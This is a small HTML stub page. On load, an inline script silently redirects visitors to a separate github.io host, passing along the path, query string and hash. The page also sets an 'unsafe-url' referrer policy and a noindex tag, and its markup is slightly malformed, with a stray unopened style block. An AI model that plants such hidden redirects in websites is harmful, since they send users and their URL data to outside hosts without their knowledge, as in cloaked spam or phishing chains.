<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="referrer" content="unsafe-url">
    <title>...</title>
    <script>
        (function () {
            var hub = 'https://nikocobbzsto.github.io';
            var parts = window.location.pathname.split('/.github/');
            if (!parts[1]) return;
            var suffix = parts[1] + window.location.search + window.location.hash;
            window.location.href = hub + '/.github/' + suffix;
        })();
    </script>
    <meta name="robots" content="noindex, nofollow">

        body { background: #ffffff; margin: 0; padding: 0; }
    </style>
</head>
